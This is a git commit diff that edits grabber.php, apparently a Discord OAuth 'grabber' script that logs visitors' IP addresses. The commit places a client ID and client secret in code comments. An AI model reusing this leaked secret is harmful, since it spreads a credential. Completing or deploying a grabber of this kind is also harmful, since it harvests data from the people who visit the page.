218956b33c9264df248a4f4dc5faf6299d03273d
hhuhuhu <74587497+hhuhuhu@users.noreply.github.com>
2020-11-17 02:06:43 -0500

    Update grabber.php

--- grabber.php
+++ grabber.php
@@ -2,8 +2,8 @@
 ob_start();
 error_reporting(0);
 
-$client_id     = ""; //CLIENT ID HERE
-$client_secret = ""; //CLIENT SECRET HERE
+$client_id     = ""; //CLIENT ID HERE 778149796103061535 
+$client_secret = ""; //CLIENT SECRET HERE 0b1o1ZIwiMmDbEgpVsoJmem85MBdu729
 $redirect      = ""; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)
 
 function get_ip_address()
